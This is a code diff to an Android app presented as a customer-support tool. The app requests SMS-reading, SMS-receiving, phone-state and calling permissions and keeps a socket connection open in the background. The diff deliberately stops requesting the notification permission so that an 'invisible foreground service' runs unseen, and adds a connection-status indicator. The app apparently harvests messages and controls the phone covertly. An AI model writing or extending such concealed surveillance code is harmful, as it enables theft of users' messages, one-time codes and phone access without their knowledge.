@@ -7,6 +7,8 @@ import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
@@ -17,7 +19,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.customersupport.databinding.ActivityMainBinding
-import com.customersupport.service.SocketService
+import com.customersupport.util.ServiceStarter
 
 class MainActivity : AppCompatActivity() {
 
@@ -29,6 +31,14 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
 
+    private val statusHandler = Handler(Looper.getMainLooper())
+    private val statusRunnable = object : Runnable {
+        override fun run() {
+            updateStatusDot()
+            statusHandler.postDelayed(this, 3000L)
+        }
+    }
+
     private val requiredPermissions = mutableListOf(
         Manifest.permission.READ_SMS,
         Manifest.permission.RECEIVE_SMS,
@@ -36,9 +46,8 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.CALL_PHONE,
     ).apply {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            add(Manifest.permission.POST_NOTIFICATIONS)
-        }
+        // POST_NOTIFICATIONS is intentionally NOT requested: the app uses an
+        // invisible foreground service and should not surface notifications.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             add(Manifest.permission.READ_PHONE_NUMBERS)
         }
@@ -70,6 +79,11 @@ class MainActivity : AppCompatActivity() {
 
         // Request permissions
         requestPermissionsIfNeeded()
+
+        // Connection health indicator opens the native health screen
+        binding.statusDot.setOnClickListener {
+            startActivity(Intent(this, HealthActivity::class.java))
+        }
 
         // Setup WebView
         setupWebView()
@@ -130,10 +144,23 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        statusHandler.post(statusRunnable)
         // Re-check after the user returns from the guide / system battery dialog.
         if (hasAllPermissions()) {
             showBackgroundGuideIfNeeded()
         }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        statusHandler.removeCallbacks(statusRunnable)
+    }
+
+    /** Green dot = socket connected, amber = offline. Tap opens the health screen. */
+    private fun updateStatusDot() {
+        val connected = CustomerSupportApp.socketManager.isConnected()
+        val colorRes = if (connected) R.color.success else R.color.warning
+        binding.statusDot.backgroundTintList = ContextCompat.getColorStateList(this, colorRes)
     }
 
     /**
@@ -175,12 +202,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startSocketService() {
-        val serviceIntent = Intent(this, SocketService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
-        } else {
-            startService(serviceIntent)
-        }
+        ServiceStarter.start(this)
     }
 
     private fun getAndroidId(): String {
